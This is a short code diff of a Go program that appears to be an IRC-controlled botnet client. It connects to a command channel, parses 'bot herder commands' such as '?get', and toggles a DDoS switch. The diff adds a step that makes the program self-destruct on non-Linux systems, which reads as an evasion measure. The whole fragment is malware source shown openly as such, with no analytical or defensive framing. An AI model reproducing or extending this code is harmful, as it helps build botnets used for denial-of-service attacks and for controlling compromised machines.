@@ -6,6 +6,7 @@ import (
 	"net/textproto"
 	"os"
 	"os/signal"
+	"runtime"
 	"syscall"
 
 	"bot/tools"
@@ -32,6 +33,9 @@ func selfDestruct() {
 }
 
 func main() {
+	if runtime.GOOS != "linux" {
+		selfDestruct()
+	}
 	irc := tools.IRC_Conn(IRC_Server)
 	tp := textproto.NewReader(bufio.NewReader(irc))
 	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)
@@ -70,6 +74,7 @@ func main() {
 			tools.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
 		}
 
+		//Check bot herder commands
 		go func() {
 			if tools.IRC_Find(ircRead, "?get") {
 				tools.DDoS_Switch = false
